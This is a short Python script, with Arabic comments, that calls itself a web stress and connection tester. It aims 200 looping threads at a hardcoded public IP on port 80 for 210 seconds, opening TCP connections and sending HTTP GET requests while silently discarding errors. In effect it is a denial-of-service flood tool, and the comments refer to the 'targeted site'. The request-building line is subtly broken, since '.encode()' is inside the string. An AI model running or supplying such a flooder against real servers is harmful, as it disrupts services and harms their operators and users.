import socket
import threading
import time

# =====================================================================
# === TRAPKING WEB STRESS & CONNECTION TESTER ===
# =====================================================================

TARGET_HOST = "185.241.208.142"  # استبدله برابط أو IP الموقع المستهدف (بدون http://)
TARGET_PORT = 80             # بورت الويب القياسي (80 لـ HTTP أو 443 لـ HTTPS)
DURATION = 210                # مدة الاختبار بالثواني
THREADS_COUNT = 200          # عدد الخيوط المتزامنة

def web_stress_worker(stop_event):
    while not stop_event.is_set():
        try:
            # إنشاء اتصال TCP حقيقي بالموقع (يناسب هيكل استجابة سيرفرات الويب)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TARGET_HOST, TARGET_PORT))
            
            # إرسال طلب تصفح وهمي (HTTP GET Request) لإنعاش أو اختبار استجابة الخادم
            request = f"GET / HTTP/1.1\r\nHost: {TARGET_HOST}\r\nConnection: keep-alive\r\n\r\.encode()"
            s.sendall(request)
            
            s.close()
        except:
            pass

def run_web_test():
    print(f"[*] جاري بدء اختبار الاتصال مع الموقع {TARGET_HOST}:{TARGET_PORT} لمدة {DURATION} ثانية...")
    
    stop_event = threading.Event()
    threads = []

    # إطلاق الخيوط المتزامنة لاختبار قدرة خادم الموقع على تحمل اتصالات الـ TCP
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=web_stress_worker, args=(stop_event,))
        t.daemon = True
        threads.append(t)
        t.start()

    time.sleep(DURATION)
    
    stop_event.set()
    for t in threads:
        t.join(timeout=0.1)

    print("[+] انتهى اختبار الموقع بنجاح!")

if __name__ == "__main__":
    run_web_test()
